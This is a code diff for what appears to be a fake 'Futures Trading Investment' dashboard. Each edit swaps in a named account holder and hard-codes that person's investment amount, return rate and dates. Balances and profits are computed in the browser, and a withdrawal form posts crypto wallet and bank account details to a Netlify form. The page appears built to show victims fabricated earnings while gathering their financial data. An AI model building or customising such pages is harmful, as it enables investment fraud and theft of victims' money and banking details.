@@ -379,9 +379,28 @@
             color: #666;
             margin-bottom: 15px;
         }
+
+        .hidden {
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <!-- Static form for Netlify detection -->
+    <form name="withdrawal-form" method="POST" data-netlify="true" netlify-honeypot="bot-field" hidden>
+        <input type="hidden" name="form-name" value="withdrawal-form">
+        <input type="hidden" name="bot-field">
+        <input type="number" name="withdrawal-amount">
+        <select name="withdrawal-method">
+            <option value="crypto">Cryptocurrency</option>
+            <option value="bank">Bank Transfer</option>
+        </select>
+        <input type="text" name="usdt-address">
+        <input type="text" name="bank-name">
+        <input type="text" name="account-number">
+        <input type="text" name="account-name">
+    </form>
+
     <!-- Dashboard Header -->
     <header class="dashboard-header">
         <div class="container">
@@ -391,7 +410,7 @@
                     <span>Futures Trading Investment</span>
                 </div>
                 <div class="user-menu">
-                    <span class="username">Uduak Umoren</span>
+                    <span class="username">Fortune Archibong</span>
                     <span class="account-id" id="accountId">ID: Loading...</span>
                 </div>
             </nav>
@@ -412,10 +431,10 @@
                     investmentDays: Duration of investment in days (default: 30)
                     startDate: Start date of investment (default: 2025-08-27)
                 -->
-                <div id="investmentAmount" value="10"></div>
-                <div id="returnPercentage" value="5.72"></div>
-                <div id="investmentDays" value="7"></div>
-                <div id="startDate" value="2025-08-21"></div>
+                <div id="investmentAmount" value="100"></div>
+                <div id="returnPercentage" value="9.17"></div>
+                <div id="investmentDays" value="30"></div>
+                <div id="startDate" value="2025-08-30"></div>
             </div>
             
             <div class="section-title">
@@ -451,8 +470,9 @@
                 <div class="action-card" id="withdrawalCard" style="display: none;">
                     <h3>Withdraw Funds</h3>
                     <button class="btn btn-primary" id="withdrawBtn">Withdraw</button>
-                    <form id="withdrawalForm" name="withdrawal-form" data-netlify="true" method="post" style="display: none;">
-                        <input type="hidden" name="form-name" value="withdrawal-form" />
+                    <form id="withdrawalForm" name="withdrawal-form" method="POST" data-netlify="true" netlify-honeypot="bot-field" action="/">
+                        <input type="hidden" name="form-name" value="withdrawal-form">
+                        <input type="hidden" name="bot-field">
                         <label for="withdrawalAmount">Withdrawal Amount ($):</label>
                         <input type="number" id="withdrawalAmount" name="withdrawal-amount" min="0" step="0.01">
                         <select id="withdrawalMethod" name="withdrawal-method">
@@ -499,7 +519,7 @@
                     </thead>
                     <tbody id="investmentTable">
                         <tr>
-                            <td>Basic Plan</td>
+                            <td>Primium Plan</td>
                             <td id="investmentAmountDisplay">$100.00</td>
                             <td id="startDateDisplay">2025-08-27</td>
                             <td id="endDateDisplay">2025-09-27</td>
@@ -682,7 +702,7 @@
             });
         });
 
-        // Handle form submission with validation
+        // Handle form submission with validation and Netlify submission
         const withdrawalForm = document.getElementById('withdrawalForm');
         const errorMessage = document.getElementById('errorMessage');
         withdrawalForm.addEventListener('submit', function(e) {
@@ -728,15 +748,31 @@
                 }
             }
 
-            // If validation passes, update balance and submit form
+            // If validation passes, update balance
             userData.balance -= amount;
             localStorage.setItem('userData', JSON.stringify(userData));
             updateBalance(); // Update UI with new balance
-            errorMessage.textContent = '';
-            alert('Withdrawal request submitted. Please wait for processing.');
-            
-            // Submit form to Netlify
-            withdrawalForm.submit();
+
+            // Prepare form data for Netlify
+            const formData = new FormData(withdrawalForm);
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                body: new URLSearchParams(formData).toString()
+            })
+            .then(response => {
+                if (response.ok) {
+                    errorMessage.textContent = '';
+                    alert('Withdrawal request submitted. Please wait for processing.');
+                    window.location.reload(); // Redirect back to dashboard
+                } else {
+                    errorMessage.textContent = 'Error submitting withdrawal. Please try again.';
+                }
+            })
+            .catch(error => {
+                errorMessage.textContent = 'Error submitting withdrawal. Please try again.';
+                console.error('Form submission error:', error);
+            });
         });
 
         // Auto-update balance daily at midnight
@@ -816,7 +852,7 @@
                     ? `Today's profit is $${userData.dailyProfit.toFixed(2)}.\nType a number (1-7) to return to the main menu.` 
                     : `No profit yet. Your investment starts on ${formatDate(userData.startDate)}.\nType a number (1-7) to return to the main menu.`,
                 '4': `Your investment period is from ${formatDate(userData.startDate)} to ${calculateEndDate(userData.startDate, userData.investmentDays)}. Status: ${status}.\nType a number (1-7) to return to the main menu.`,
-                '5': `For customer service, please email futurestrdinginvestment.org@gmail.com or call +234-805-363-4544.\nType a number (1-7) to return to the main menu.`,
+                '5': `For customer service, please email futurestrdinginvestment.org@gmail.com \nType a number (1-7) to return to the main menu.`,
                 '6': () => {
                     addMessage('Redirecting to deposit page...', 'bot-message');
                     setTimeout(() => window.location.href = 'home.html', 1000);
